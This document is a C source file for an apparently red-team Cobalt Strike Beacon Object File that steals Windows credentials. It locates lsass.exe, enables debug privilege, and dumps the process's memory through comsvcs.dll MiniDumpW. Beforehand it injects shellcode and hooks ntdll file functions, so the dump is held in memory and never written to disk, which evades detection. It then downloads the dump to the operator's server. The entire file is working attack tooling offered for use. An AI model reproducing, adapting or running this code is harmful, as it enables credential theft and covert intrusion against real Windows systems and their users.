#include <windows.h>

#include "Base.c"
#include "beacon.h"
#include "bofdefs.h"

struct FileInfo *pFileInfo = NULL;

#include "InstallHooks.c"
#include "MemClean.c"
#include "MemFetch.c"

#define TARGET_PROCESS "lsass.exe"
#define FAKE_DUMP_PATH "C:\\Temp\\redteam\\hello.dmp"

typedef HRESULT(WINAPI *_MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI *_RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable,
                                              BOOL CurrentThread,
                                              PULONG Enabled);
BOOL EnumProcess(IN char *pProcessName, OUT DWORD *pdwProcessId) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (stricmp(pe32.szExeFile, pProcessName) == 0) {
            *pdwProcessId = pe32.th32ProcessID;
            CloseHandle(hSnapshot);
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe32));
}

BOOL ComsvcsDump() {
    char *DumpPath = FAKE_DUMP_PATH;
    int dwDumpPath = 0x00;
    WCHAR wCommandLine[MAX_PATH] = {0};
    WCHAR wDumpPath[MAX_PATH] = {0};
    DWORD Pid;
    HRESULT hr;
    ULONG t;
    _MiniDumpW MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;
    /* Start Dump lsass via comsvcs */
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Dump via Memfiles\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Start Enum Process\n");

    if (!EnumProcess(TARGET_PROCESS, &Pid)) return FALSE;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target PID: %d\n", Pid);

    swprintf_s(wDumpPath, MAX_PATH, L"%hs", DumpPath);
    swprintf_s(wCommandLine, MAX_PATH, L"%d %ls full", Pid, wDumpPath);

    MiniDumpW =
        (_MiniDumpW)GetProcAddress(LoadLibrary("comsvcs.dll"), "MiniDumpW");
    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
        LoadLibrary("ntdll"), "RtlAdjustPrivilege");

    if (MiniDumpW == NULL || RtlAdjustPrivilege == NULL) return FALSE;

    RtlAdjustPrivilege(20, TRUE, FALSE, &t);

    MiniDumpW(0, 0, wCommandLine);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done!\n");

    memset(wDumpPath, 0, MAX_PATH);
    memset(wCommandLine, 0, MAX_PATH);

    return TRUE;
}

void go(IN PCHAR args, IN ULONG argc) {
    if (!bofstart()) return;

    datap parser = {0};

    pFileInfo = malloc(sizeof(struct FileInfo));
    memset(pFileInfo, 0, sizeof(struct FileInfo));
    pFileInfo->numFiles = 0;
    pFileInfo->totalFiles = 0;
    if (!BeaconAddValue(MF_FILE_INFO_KEY, pFileInfo)) {
        BeaconPrintf(CALLBACK_ERROR, "failed to call BeaconAddValue");
        return;
    }

    BeaconDataParse(&parser, args, argc);

    char *ntcreatefilebytes =
        BeaconDataExtract(&parser, &pFileInfo->PICNtCreateFileLen);
    char *ntwritefilebytes =
        BeaconDataExtract(&parser, &pFileInfo->PICNtWriteFileLen);
    char *ntclosebytes = BeaconDataExtract(&parser, &pFileInfo->PICNtCloseLen);
    char *ntqueryvolumeinformationfilebytes = BeaconDataExtract(
        &parser, &pFileInfo->PICNtQueryVolumeInformationFileLen);
    char *ntqueryinformationfilebytes =
        BeaconDataExtract(&parser, &pFileInfo->PICNtQueryInformationFileLen);
    char *ntsetinformationfilebytes =
        BeaconDataExtract(&parser, &pFileInfo->PICNtSetInformationFileLen);
    char *ntreadfilebytes =
        BeaconDataExtract(&parser, &pFileInfo->PICNtReadFileLen);
    char *ntopenfilebytes =
        BeaconDataExtract(&parser, &pFileInfo->PICNtOpenFileLen);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successful get all PIC shellcode\n");

    patchAddr(&ntcreatefilebytes, pFileInfo->PICNtCreateFileLen);
    patchAddr(&ntwritefilebytes, pFileInfo->PICNtWriteFileLen);
    patchAddr(&ntclosebytes, pFileInfo->PICNtCloseLen);
    patchAddr(&ntqueryvolumeinformationfilebytes,
              pFileInfo->PICNtQueryVolumeInformationFileLen);
    patchAddr(&ntqueryinformationfilebytes,
              pFileInfo->PICNtQueryInformationFileLen);
    patchAddr(&ntsetinformationfilebytes,
              pFileInfo->PICNtSetInformationFileLen);
    patchAddr(&ntreadfilebytes, pFileInfo->PICNtReadFileLen);
    patchAddr(&ntopenfilebytes, pFileInfo->PICNtOpenFileLen);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully patch pic\n");

    inject(ntcreatefilebytes, pFileInfo->PICNtCreateFileLen,
           &pFileInfo->PICNtCreateFile);
    inject(ntwritefilebytes, pFileInfo->PICNtWriteFileLen,
           &pFileInfo->PICNtWriteFile);
    inject(ntclosebytes, pFileInfo->PICNtCloseLen, &pFileInfo->PICNtClose);
    inject(ntqueryvolumeinformationfilebytes,
           pFileInfo->PICNtQueryVolumeInformationFileLen,
           &pFileInfo->PICNtQueryVolumeInformationFile);
    inject(ntqueryinformationfilebytes, pFileInfo->PICNtQueryInformationFileLen,
           &pFileInfo->PICNtQueryInformationFile);
    inject(ntsetinformationfilebytes, pFileInfo->PICNtSetInformationFileLen,
           &pFileInfo->PICNtSetInformationFile);
    inject(ntreadfilebytes, pFileInfo->PICNtReadFileLen,
           &pFileInfo->PICNtReadFile);
    inject(ntopenfilebytes, pFileInfo->PICNtOpenFileLen,
           &pFileInfo->PICNtOpenFile);

    hookNtFunction("NtCreateFile", pFileInfo->PICNtCreateFile,
                   &pFileInfo->NtCreateFiletrampoline,
                   &pFileInfo->NtCreateFileorigbytes, TRUE);
    hookNtFunction("NtWriteFile", pFileInfo->PICNtWriteFile,
                   &pFileInfo->NtWriteFiletrampoline,
                   &pFileInfo->NtWriteFileorigbytes, TRUE);
    hookNtFunction("NtClose", pFileInfo->PICNtClose,
                   &pFileInfo->NtClosetrampoline, &pFileInfo->NtCloseorigbytes,
                   TRUE);
    hookNtFunction("NtQueryVolumeInformationFile",
                   pFileInfo->PICNtQueryVolumeInformationFile,
                   &pFileInfo->NtQueryVolumeInformationFiletrampoline,
                   &pFileInfo->NtQueryVolumeInformationFileorigbytes, TRUE);
    hookNtFunction("NtQueryInformationFile",
                   pFileInfo->PICNtQueryInformationFile,
                   &pFileInfo->NtQueryInformationFiletrampoline,
                   &pFileInfo->NtQueryInformationFileorigbytes, TRUE);
    hookNtFunction("NtSetInformationFile", pFileInfo->PICNtSetInformationFile,
                   &pFileInfo->NtSetInformationFiletrampoline,
                   &pFileInfo->NtSetInformationFileorigbytes, TRUE);
    hookNtFunction("NtReadFile", pFileInfo->PICNtReadFile,
                   &pFileInfo->NtReadFiletrampoline,
                   &pFileInfo->NtReadFileorigbytes, TRUE);
    hookNtFunction("NtOpenFile", pFileInfo->PICNtOpenFile,
                   &pFileInfo->NtOpenFiletrampoline,
                   &pFileInfo->NtOpenFileorigbytes, TRUE);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Hook Done!\n");

    if (!ComsvcsDump()) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Can't Dump lsass!\n");
        return;
    }

    /* Download Dump and clean */
    pFileInfo = BeaconGetValue(MF_FILE_INFO_KEY);
    BOOL force = BeaconDataInt(&parser);
    if (!pFileInfo) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[X] Failed to call BeaconGetValue! Maybe no run meminit?\n");
        return;
    }

    if (pFileInfo->numFiles > 0) {
        int filesfetched = 0;
        for (int i = 0; i < 100; i++) {
            if (pFileInfo->filehandle[i] != NULL) {
                size_t required_size =
                    WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1,
                                        NULL, 0, NULL, NULL);

                char *filename = calloc(required_size + 1, sizeof(char));

                WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1,
                                    filename, required_size, NULL, NULL);

                if (pFileInfo->fileclosed[i] == TRUE || force) {
                    if (force)
                        BeaconPrintf(CALLBACK_OUTPUT,
                                     "[*] Force Download Memfiles!\n");

                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Start Download %s\n",
                                 filename);
                    downloadFile(filename, strlen(filename),
                                 pFileInfo->filedata[i],
                                 pFileInfo->filedatalen[i]);

                    // Now free all of the FileInfo entires associated with the
                    // file since it has been downloaded/sent to the TS.
                    memset(pFileInfo->filename[i], 0,
                           ((wcslen(pFileInfo->filename[i]) + 1) * 2));
                    free(pFileInfo->filename[i]);
                    pFileInfo->filename[i] = NULL;

                    memset(pFileInfo->filedata[i], 0,
                           pFileInfo->fileallocationlen[i]);
                    free(pFileInfo->filedata[i]);
                    pFileInfo->filedata[i] = NULL;

                    pFileInfo->filehandle[i] = NULL;
                    pFileInfo->fileallocationlen[i] = 0;
                    pFileInfo->filedatalen[i] = 0;
                    pFileInfo->fileclosed[i] = FALSE;

                    // Track how many files we have downloaded and cleared from
                    // memory
                    filesfetched++;
                    BeaconPrintf(CALLBACK_OUTPUT,
                                 "[+] %s Download Successfully!\n", filename);
                }
                free(filename);
            }
        }

        pFileInfo->numFiles = pFileInfo->numFiles - filesfetched;
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "\n[+] Downloaded and cleaned up %d files from memory!\n[+] %d "
            "files remaining in memory as tracked by MemFiles!\n",
            filesfetched, pFileInfo->numFiles);

    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[-] No files currently stored by MemFiles!\n");
    }

    CleanMemFiles();
    printoutput(TRUE);
    return;
}
